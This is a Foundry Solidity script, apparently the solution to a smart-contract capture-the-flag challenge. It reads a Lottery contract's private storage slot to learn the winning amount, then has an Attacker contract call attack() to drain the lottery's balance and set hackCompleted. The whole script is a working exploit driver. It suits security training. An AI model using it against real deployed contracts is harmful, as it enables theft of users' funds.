// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Script, console} from "lib/forge-std/src/Script.sol";

import "src/Lottery.sol";
import "src/Attacker.sol";

contract AttackScript is Script {
    Lottery public lottery;
    Attacker public attacker;

    function setUp() public {
        lottery = Lottery(payable(vm.envAddress("LOTTERY_ADDRESS")));
        attacker = Attacker(payable(vm.envAddress("ATTACKER_ADDRESS")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("lottery balance before", address(lottery).balance);
        console.log("attacker balance before", address(attacker).balance);

        uint256 winAmount = uint256(
            vm.load(address(lottery), bytes32(uint256(0)))
        );
        console.log("winAmount", winAmount);

        attacker.setWinAmount(winAmount);

        attacker.attack();

        console.log("lottery balance after", address(lottery).balance);
        console.log("attacker balance after", address(attacker).balance);

        console.log("hackCompleted", lottery.hackCompleted());

        vm.stopBroadcast();
    }
}
